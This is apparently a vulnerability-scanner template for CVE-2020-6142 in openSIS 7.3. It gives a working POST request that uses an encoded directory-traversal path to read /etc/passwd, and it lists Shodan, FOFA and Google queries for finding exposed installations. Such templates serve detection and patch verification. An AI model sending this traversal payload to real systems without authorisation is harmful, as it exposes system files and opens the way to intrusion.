id: CVE-2020-6142

info:
  name: OS4Ed openSIS Modules.php Remote Code Execution Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: A remote code execution vulnerability exists in the Modules.php functionality of OS4Ed openSIS 7.3. A specially crafted HTTP request can cause local file inclusion.
  impact: |
    Successful exploitation could allow an attacker to execute arbitrary code on the target system.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  reference:
    - https://talosintelligence.com/vulnerability_reports/TALOS-2020-1082
    - https://github.com/404notf0und/CVE-Flow
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-6142
    cwe-id: CWE-22
    epss-score: 0.01386
    epss-percentile: 0.8689
    cpe: cpe:2.3:a:os4ed:opensis:7.3:*:*:*:-:*:*:*
  metadata:
    vendor: os4ed
    product: opensis
    shodan-query: http.title:"openSIS"
    fofa-query: title="opensis"
    google-query: intitle:"opensis"

http:
  - method: POST
    path:
      - "{{BaseURL}}/opensis/Modules.php?modname=grades%2fReportCards.php..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&modfunc=&search_modfunc=list&next_modname=grades/ReportCards.php"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Referer: http://{{Hostname}}/opensis6/opensis/Modules.php?modname=miscellaneous/Portal.php&failed_login=0
      Cookie: dhtmlgoodies_tab_menu_tabIndex=index%3A%205; PHPSESSID=6chg16qcanbg3adrqlq6sm6fa3
      Connection: keep-alive
      Content-Type: application/x-www-form-urlencoded

    body: |
      last=a&first=&stuid=&altid=&addr=&grade=&gpa_low=&gpa_high=&cgpa_low=&cgpa_high=&class_rank_term=CUM&class_rank_low=&class_rank_high=&sql_save_session=true&mp_comment=&day_from_birthdate=&month_from_birthdate=&day_to_birthdate=&month_to_birthdate=&goal_title=&goal_description=&progress_name=&progress_description=&med_day=&med_month=&med_year=&doctors_note_comments=&type=&imm_day=&imm_month=&imm_year=&imm_comments=&ma_day=&ma_month=&ma_year=&med_alrt_title=&nv_day=&nv_month=&nv_year=&reason=&result=&med_vist_comments=
    matchers:
      - type: word
        words:
          - "root:x"
        part: body
